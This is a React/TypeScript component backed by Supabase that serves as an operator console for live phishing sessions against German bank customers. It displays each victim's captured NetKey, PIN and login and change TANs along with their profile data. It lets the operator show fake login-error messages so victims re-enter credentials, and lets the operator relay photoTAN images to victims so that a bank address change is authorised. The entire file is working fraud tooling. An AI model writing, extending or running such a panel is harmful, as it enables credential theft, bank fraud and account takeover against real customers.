import { useEffect, useRef, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { MapPin, Link2, XCircle, CheckCircle2, Trash2, Upload, RotateCcw, RefreshCw, Smartphone } from "lucide-react";
import { toast } from "sonner";

type Row = {
  id: string;
  token: string;
  auftraggeber_name: string | null;
  auftraggeber_iban: string | null;
  curr_strasse: string | null;
  curr_plz: string | null;
  curr_ort: string | null;
  new_strasse: string | null;
  new_plz: string | null;
  new_ort: string | null;
  profile_data: Record<string, string> | null;
  customer_phase: string | null;
  tan_method: string | null;
  device_name: string | null;
  show_berater: boolean | null;
  photo_tan_image: string | null;
  last_error: string | null;
  tan_code: string | null;
  used: boolean;
  created_at: string;
};

type MetaRow = { task_id: string; netkey: string | null; pin: string | null; login_tan?: string | null; berater_geburtsdatum?: string | null; berater_karte?: string | null };

const PROFILE_LABELS: Record<string, string> = {
  titel: "Titel", vorname: "Vorname", nachname: "Nachname", geburtsdatum: "Geburtsdatum",
  geburtsort: "Geburtsort", mobil: "Mobil", festnetz: "Festnetz", email: "E-Mail",
  strasse: "Straße", zusatz: "Adresszusatz", plz: "PLZ", ortLand: "Ort",
};

const PHASE_LABEL: Record<string, string> = {
  waiting: "Wartet auf Kunde",
  token_waiting: "Token eingegeben – wartet auf Freigabe",
  berater: "Berater-Verifizierung",
  login: "Kunde online – Login",
  login_review: "Login prüfen",
  login_rejected: "Login abgelehnt",
  confirm: "Gerätebestätigung",
  login_phototan_request: "Login-PhotoTAN vorbereiten",
  login_phototan: "Login-PhotoTAN Eingabe",
  login_phototan_rejected: "Login-TAN abgelehnt",
  login_tan_review: "Login-TAN prüfen",
  adress_edit: "Kunde bearbeitet Profil",
  adress_review: "Neue Daten prüfen",
  adress_rejected: "Adresse abgelehnt",
  change_phototan_request: "Änderungs-PhotoTAN vorbereiten",
  change_phototan: "Änderungs-TAN Eingabe",
  change_phototan_rejected: "Änderungs-TAN abgelehnt",
  change_tan_review: "Änderungs-TAN prüfen",
  success: "Erfolgreich",
  aborted: "Abgebrochen",
};

const AdressLiveCard = () => {
  const [rows, setRows] = useState<Row[]>([]);
  const [metas, setMetas] = useState<Record<string, MetaRow>>({});

  const load = async () => {
    const [{ data: a }, { data: m }] = await Promise.all([
      (supabase as any).from("adress_tokens").select("*").order("created_at", { ascending: false }).limit(50),
      (supabase as any).from("panel_task_meta").select("task_id, netkey, pin, login_tan, berater_geburtsdatum, berater_karte").like("task_id", "adress:%"),
    ]);
    setRows(a || []);
    const map: Record<string, MetaRow> = {};
    (m || []).forEach((x: any) => { map[String(x.task_id).replace(/^adress:/, "")] = x; });
    setMetas(map);
  };

  useEffect(() => {
    load();
    const ch1 = (supabase as any).channel("adress_live_tokens")
      .on("postgres_changes", { event: "*", schema: "public", table: "adress_tokens" }, load).subscribe();
    const ch2 = (supabase as any).channel("adress_live_meta")
      .on("postgres_changes", { event: "*", schema: "public", table: "panel_task_meta" }, load).subscribe();
    const iv = window.setInterval(load, 4000);
    return () => { window.clearInterval(iv); (supabase as any).removeChannel(ch1); (supabase as any).removeChannel(ch2); };
  }, []);

  const update = async (id: string, patch: Record<string, any>) => {
    const { error } = await (supabase as any).from("adress_tokens").update(patch).eq("id", id);
    if (error) toast.error(error.message);
  };
  const setPhase = (r: Row, phase: string, extra: Record<string, any> = {}) => update(r.id, { customer_phase: phase, ...extra });

  const rejectLogin = (r: Row) => setPhase(r, "login_rejected", { last_error: "Anmeldung fehlgeschlagen. Bitte überprüfen Sie Ihre Zugangsdaten." });
  const acceptLogin = (r: Row) => setPhase(r, "confirm", { last_error: null });
  const setDeviceName = (r: Row, name: string) => update(r.id, { device_name: name });
  const setPhotoTanImage = (r: Row, dataUrl: string | null) => update(r.id, { photo_tan_image: dataUrl });
  const showLoginPhotoTan = (r: Row) => setPhase(r, "login_phototan", { last_error: null });
  const rejectLoginTan = async (r: Row) => {
    await (supabase as any).from("panel_task_meta").update({ login_tan: null }).eq("task_id", `adress:${r.id}`);
    await setPhase(r, "login_phototan_rejected", { last_error: "Ihre Eingabe konnte nicht verifiziert werden. Bitte erneut versuchen." });
  };
  const acceptLoginTan = (r: Row) => setPhase(r, "adress_edit", { photo_tan_image: null, last_error: null });

  const acceptNewAddress = (r: Row) => setPhase(r, "change_phototan_request", { photo_tan_image: null, last_error: null });
  const rejectNewAddress = (r: Row) => setPhase(r, "adress_rejected", { last_error: "Die eingegebenen Daten konnten nicht übernommen werden. Bitte prüfen." });

  const showChangePhotoTan = (r: Row) => {
    if (!r.photo_tan_image) { toast.error("Bitte zuerst PhotoTAN-Bild hochladen"); return; }
    setPhase(r, "change_phototan", { last_error: null });
  };
  const rejectChangeTan = (r: Row) => update(r.id, { tan_code: null, customer_phase: "change_phototan_rejected", last_error: "Die eingegebene Änderungs-TAN ist ungültig. Bitte erneut versuchen." });
  const acceptChangeTan = (r: Row) => update(r.id, { customer_phase: "success", used: true, used_at: new Date().toISOString(), last_error: null });
  const finishSuccess = (r: Row) => update(r.id, { customer_phase: "success", used: true, used_at: new Date().toISOString(), last_error: null });

  const sendBackToAuth = async (r: Row) => { await setPhase(r, "aborted", { last_error: null }); toast.success("Kunde wird zu /auth zurückgeleitet"); };
  const remove = async (r: Row) => {
    if (!window.confirm("Session wirklich löschen?")) return;
    await (supabase as any).from("panel_task_meta").delete().eq("task_id", `adress:${r.id}`);
    await (supabase as any).from("adress_tokens").delete().eq("id", r.id);
    toast.success("Gelöscht");
  };
  const copyLink = async (r: Row) => {
    const url = `${window.location.origin}/auth?token=${r.token}`;
    try { await navigator.clipboard.writeText(url); toast.success("Kunden-Link kopiert"); } catch { toast.error("Kopieren fehlgeschlagen"); }
  };

  const visible = rows.filter(r => { const p = r.customer_phase; return p && p !== "pending"; });

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2"><MapPin className="h-5 w-5" /> Live-Steuerung Adress-Änderung</CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        {!visible.length && <div className="text-sm text-muted-foreground">Keine aktiven Adress-Sessions.</div>}
        {visible.map(r => {
          const meta = metas[r.id];
          const phase = r.customer_phase || "login";
          const done = phase === "success" || phase === "aborted";
          return (
            <div key={r.id} className={`rounded-md border p-4 space-y-3 ${done ? "opacity-70" : ""}`}>
              <div className="flex flex-wrap items-center justify-between gap-2">
                <div className="flex items-center gap-2 min-w-0">
                  <span className="font-mono text-sm px-2 py-0.5 rounded bg-muted">{r.token}</span>
                  <Badge variant={done ? "secondary" : "default"}>{PHASE_LABEL[phase] || phase}</Badge>
                  {r.used && <Badge variant="secondary">Token verwendet</Badge>}
                  {r.auftraggeber_name && <span className="text-sm text-muted-foreground truncate">{r.auftraggeber_name}</span>}
                </div>
                <div className="flex gap-1">
                  <Button size="sm" variant="ghost" onClick={() => copyLink(r)} title="Kunden-Link kopieren"><Link2 className="h-4 w-4" /></Button>
                  <Button size="sm" variant="ghost" onClick={() => remove(r)} title="Löschen"><Trash2 className="h-4 w-4" /></Button>
                </div>
              </div>

              <div className="grid sm:grid-cols-3 gap-2 text-sm">
                <MetaField label="NetKey" value={meta?.netkey || "—"} mono />
                <MetaField label="PIN" value={meta?.pin || "—"} mono />
                <MetaField label="Login-TAN" value={meta?.login_tan || "—"} mono bold />
              </div>

              <div className="grid sm:grid-cols-2 gap-2 text-xs">
                <div className="rounded border p-2">
                  <div className="uppercase text-[10px] text-muted-foreground mb-0.5">Aktuelle Adresse (Admin)</div>
                  <div>{r.curr_strasse || "—"}</div>
                  <div>{[r.curr_plz, r.curr_ort].filter(Boolean).join(" ") || "—"}</div>
                </div>
                <div className="rounded border p-2 bg-primary/5">
                  <div className="uppercase text-[10px] text-muted-foreground mb-0.5">Neue Adresse (Kunde)</div>
                  <div className="font-medium">{r.new_strasse || "—"}</div>
                  <div className="font-medium">{[r.new_plz, r.new_ort].filter(Boolean).join(" ") || "—"}</div>
                </div>
              </div>

              {r.profile_data && Object.values(r.profile_data).some(Boolean) && (
                <div className="rounded border p-2 bg-muted/40">
                  <div className="uppercase text-[10px] text-muted-foreground mb-1">Vollständige Profildaten</div>
                  <div className="grid sm:grid-cols-2 gap-x-4 gap-y-0.5 text-xs">
                    {Object.entries(r.profile_data).map(([k, v]) => v ? (<div key={k}><span className="font-semibold">{PROFILE_LABELS[k] || k}:</span> {v}</div>) : null)}
                  </div>
                </div>
              )}

              <div className="text-sm">
                <div className="text-[10px] uppercase text-muted-foreground">Eingegebene Änderungs-TAN</div>
                <div className="font-mono font-bold text-base">{r.tan_code || "—"}</div>
              </div>

              {!done && (
                <div className="space-y-3 pt-2 border-t">
                  <StepBlock title="Kundendaten (Vorbelegung wie in TG)">
                    <ProfileDataEditor r={r} onSave={(data) => update(r.id, { profile_data: data })} />
                  </StepBlock>

                  {phase === "token_waiting" && (
                    <StepBlock title="Profilbearbeitung freigeben">
                      <p className="text-xs text-muted-foreground">Kunde hat den Token eingegeben und wartet.</p>
                      <Button size="sm" onClick={() => setPhase(r, r.show_berater ? "berater" : "adress_edit", { last_error: null })}>
                        Profil-Seite anzeigen
                      </Button>
                    </StepBlock>
                  )}

                  {(phase === "adress_edit" || phase === "adress_review" || phase === "adress_rejected") && (
                    <StepBlock title="Profil / Adresse">
                      {phase === "adress_edit" && <p className="text-xs text-muted-foreground">Kunde füllt Profildaten aus.</p>}
                      {phase === "adress_review" && (
                        <div className="flex flex-wrap gap-2">
                          <Button size="sm" variant="destructive" onClick={() => rejectNewAddress(r)} disabled={!r.new_strasse}>
                            <XCircle className="h-4 w-4 mr-1" />Adresse ablehnen
                          </Button>
                          <Button size="sm" onClick={() => acceptNewAddress(r)} disabled={!r.new_strasse}>
                            <CheckCircle2 className="h-4 w-4 mr-1" />Adresse akzeptieren → Änderungs-TAN
                          </Button>
                        </div>
                      )}
                    </StepBlock>
                  )}

                  {phase === "change_phototan_request" && (
                    <StepBlock title="Änderungs-PhotoTAN freigeben">
                      <PhotoTanUploader r={r} onSet={u => setPhotoTanImage(r, u)} />
                      <Button size="sm" onClick={() => showChangePhotoTan(r)} disabled={!r.photo_tan_image}>
                        <CheckCircle2 className="h-4 w-4 mr-1" />PhotoTAN anzeigen
                      </Button>
                    </StepBlock>
                  )}

                  {(phase === "change_phototan" || phase === "change_tan_review" || phase === "change_phototan_rejected") && (
                    <StepBlock title="Änderungs-TAN prüfen">
                      <PhotoTanUploader r={r} onSet={u => setPhotoTanImage(r, u)} compact />
                      <div className="flex flex-wrap gap-2">
                        <Button size="sm" variant="destructive" onClick={() => rejectChangeTan(r)} disabled={!r.tan_code}>
                          <XCircle className="h-4 w-4 mr-1" />TAN ablehnen
                        </Button>
                        <Button size="sm" variant="outline" onClick={() => showChangePhotoTan(r)}>
                          <RefreshCw className="h-4 w-4 mr-1" />Neue PhotoTAN
                        </Button>
                        <Button size="sm" onClick={() => acceptChangeTan(r)} disabled={!r.tan_code}>
                          <CheckCircle2 className="h-4 w-4 mr-1" />TAN akzeptieren → /success
                        </Button>
                      </div>
                    </StepBlock>
                  )}

                  <div className="flex flex-wrap justify-between gap-2 pt-2 border-t">
                    <Button size="sm" variant="outline" onClick={() => sendBackToAuth(r)}>
                      <RotateCcw className="h-4 w-4 mr-1" />Kunde zurück zu /auth
                    </Button>
                    <Button size="sm" variant="default" onClick={() => finishSuccess(r)}>
                      <CheckCircle2 className="h-4 w-4 mr-1" />Direkt zu /success (5s → /auth)
                    </Button>
                  </div>
                </div>
              )}
            </div>
          );
        })}
      </CardContent>
    </Card>
  );
};

const StepBlock = ({ title, children }: { title: string; children: React.ReactNode }) => (
  <div className="space-y-2">
    <div className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">{title}</div>
    {children}
  </div>
);

const MetaField = ({ label, value, mono, bold }: { label: string; value: string; mono?: boolean; bold?: boolean }) => (
  <div className="min-w-0">
    <div className="text-[10px] uppercase tracking-wider text-muted-foreground">{label}</div>
    <div className={`truncate ${mono ? "font-mono" : ""} ${bold ? "font-bold text-base" : ""}`}>{value}</div>
  </div>
);

const DeviceNameField = ({ r, onSave }: { r: Row; onSave: (n: string) => void }) => {
  const [val, setVal] = useState(r.device_name || "");
  useEffect(() => { setVal(r.device_name || ""); }, [r.device_name]);
  return (
    <div className="flex items-center gap-1">
      <Input value={val} onChange={e => setVal(e.target.value)} placeholder="Gerätename" className="h-8 w-48" />
      <Button size="sm" variant="outline" onClick={() => onSave(val)}>Setzen</Button>
    </div>
  );
};

const PhotoTanUploader = ({ r, onSet, compact }: { r: Row; onSet: (u: string | null) => void; compact?: boolean }) => {
  const inputRef = useRef<HTMLInputElement>(null);
  const [url, setUrl] = useState("");
  const [loading, setLoading] = useState(false);

  const onFile = async (f: File) => {
    const reader = new FileReader();
    reader.onload = () => onSet(String(reader.result));
    reader.readAsDataURL(f);
  };
  const onUrl = async () => {
    const u = url.trim(); if (!u) return;
    setLoading(true);
    try {
      const { data, error } = await (supabase as any).functions.invoke("fetch-photo-tan", { body: { url: u, autoCrop: true } });
      if (error || !data?.dataUrl) throw new Error(error?.message || "Fehler");
      onSet(data.dataUrl); setUrl(""); toast.success("PhotoTAN übernommen");
    } catch (e: any) { toast.error(e.message || "Konnte Bild nicht laden"); }
    finally { setLoading(false); }
  };

  return (
    <div className="space-y-2">
      <div className="flex items-center gap-2 flex-wrap">
        <input ref={inputRef} type="file" accept="image/*" hidden
          onChange={e => { const f = e.target.files?.[0]; if (f) onFile(f); e.target.value = ""; }} />
        <Button size="sm" variant="outline" onClick={() => inputRef.current?.click()}>
          <Upload className="h-4 w-4 mr-1" />{r.photo_tan_image ? "Bild ersetzen" : "Bild hochladen"}
        </Button>
        {r.photo_tan_image && (
          <>
            {!compact && <img src={r.photo_tan_image} alt="preview" className="h-10 w-10 object-contain border rounded" />}
            <Button size="sm" variant="ghost" onClick={() => onSet(null)}>entfernen</Button>
          </>
        )}
        {!r.photo_tan_image && <span className="text-xs text-muted-foreground">oder Link einfügen ↓</span>}
      </div>
      <div className="flex items-center gap-2 flex-wrap">
        <Input value={url} onChange={e => setUrl(e.target.value)} onKeyDown={e => { if (e.key === "Enter") onUrl(); }}
          placeholder="Bild-URL" className="h-8 flex-1 min-w-[220px]" />
        <Button size="sm" onClick={onUrl} disabled={loading || !url.trim()}>{loading ? "Lade..." : "Übernehmen"}</Button>
      </div>
    </div>
  );
};

const PROFILE_FIELD_ORDER: Array<{ key: string; label: string; placeholder?: string }> = [
  { key: "titel", label: "Titel", placeholder: "Herr / Frau / Divers" },
  { key: "vorname", label: "Vorname" },
  { key: "nachname", label: "Nachname" },
  { key: "geburtsdatum", label: "Geburtsdatum", placeholder: "TT.MM.JJJJ" },
  { key: "geburtsort", label: "Geburtsort" },
  { key: "mobil", label: "Mobil" },
  { key: "festnetz", label: "Festnetz" },
  { key: "email", label: "E-Mail" },
  { key: "strasse", label: "Straße + Nr." },
  { key: "zusatz", label: "Adresszusatz" },
  { key: "plz", label: "PLZ" },
  { key: "ortLand", label: "Ort" },
];

const ProfileDataEditor = ({ r, onSave }: { r: Row; onSave: (data: Record<string, string>) => void }) => {
  const [vals, setVals] = useState<Record<string, string>>(() => ({ ...(r.profile_data || {}) }));
  const [dirty, setDirty] = useState(false);
  useEffect(() => { setVals({ ...(r.profile_data || {}) }); setDirty(false); }, [r.id]);

  const set = (k: string, v: string) => { setVals(p => ({ ...p, [k]: v })); setDirty(true); };
  const save = async () => {
    const cleaned: Record<string, string> = {};
    Object.entries(vals).forEach(([k, v]) => { if (v && String(v).trim()) cleaned[k] = String(v).trim(); });
    onSave(cleaned); setDirty(false); toast.success("Kundendaten gespeichert");
  };

  return (
    <div className="space-y-2">
      <p className="text-xs text-muted-foreground">Diese Daten werden dem Kunden auf der Profil-Seite vorbelegt.</p>
      <div className="grid sm:grid-cols-2 gap-2">
        {PROFILE_FIELD_ORDER.map(f => (
          <div key={f.key} className="space-y-0.5">
            <div className="text-[10px] uppercase tracking-wider text-muted-foreground">{f.label}</div>
            <Input value={vals[f.key] || ""} placeholder={f.placeholder} onChange={e => set(f.key, e.target.value)} className="h-8" />
          </div>
        ))}
      </div>
      <div className="flex justify-end">
        <Button size="sm" onClick={save} disabled={!dirty}>Kundendaten speichern</Button>
      </div>
    </div>
  );
};

export default AdressLiveCard;
